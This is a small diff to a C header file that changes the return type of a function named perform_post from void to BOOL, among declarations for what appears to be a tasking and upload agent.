@@ -127,7 +127,7 @@ void perform_tasking(AgentState *state, TaskingReply *reply);
 
 char *generate_post_message(TaskPostRequest *post);
 void free_post_request(TaskPostRequest *request);
-void perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status);
+BOOL perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char *output, char *status);
 
 UploadManager initialise_upload_manager(char *callback_uuid, char *task_id, char *file_uuid);
 void free_upload_manager(UploadManager *upload);
